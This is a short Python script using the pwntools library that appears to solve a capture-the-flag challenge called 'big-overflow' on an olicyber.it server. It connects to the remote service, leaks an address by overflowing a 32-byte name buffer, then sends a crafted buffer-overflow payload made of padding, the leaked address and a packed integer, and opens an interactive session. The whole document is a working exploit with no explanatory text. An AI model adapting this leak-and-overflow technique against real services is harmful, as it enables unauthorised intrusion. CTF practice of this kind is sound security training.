from pwn import *

p = remote('big-overflow.challs.olicyber.it', 34003)
p.recvuntil(b"name?")
p.send(b'a'*32)
p.recvuntil(b'heard ')
add = p.recvuntil(b'but')
print(f'RICEVUTO {add}')
add = add.replace(b'a', b'')
add = add.replace(b'but', b'')

print(f'INVIERO {add}')
p.recvuntil(b'please: ')
num = p32(95099824)
print(num.hex())
add = (int(add.hex(),16)).to_bytes(6)
payload = b'a'*32 + add + b'\x00'*2 +  num
print(payload)
p.send(payload)
p.interactive()